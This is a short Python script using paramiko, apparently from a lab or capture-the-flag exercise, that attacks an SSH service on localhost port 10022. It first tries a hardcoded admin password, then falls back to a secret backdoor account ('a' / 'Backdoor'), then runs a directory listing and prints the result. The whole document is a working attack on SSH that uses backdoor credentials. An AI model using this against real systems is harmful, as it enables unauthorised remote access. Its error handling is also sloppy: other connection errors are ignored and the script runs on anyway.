import paramiko

def ssh_backdoor():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect('localhost', port=10022, username='admin', password='98765432')
    except Exception as e:
        if "Authentication failed" in str(e):
            print("User 'Admin' Authentication failed, trying backdoor...")
            try:
                ssh.connect('localhost', port=10022, username='a', password='Backdoor')
            except Exception as e:
                if "Authentication failed" in str(e):
                    print("Backdoor Authentication failed, stop attacking with SSH")
                    return {}

    stdin, stdout, stderr = ssh.exec_command("cd /; ls")
    
    # 获取命令结果
    res, err = stdout.read(), stderr.read()
    result = res if res else err
    res = result.decode(encoding="utf-8")
    print(res)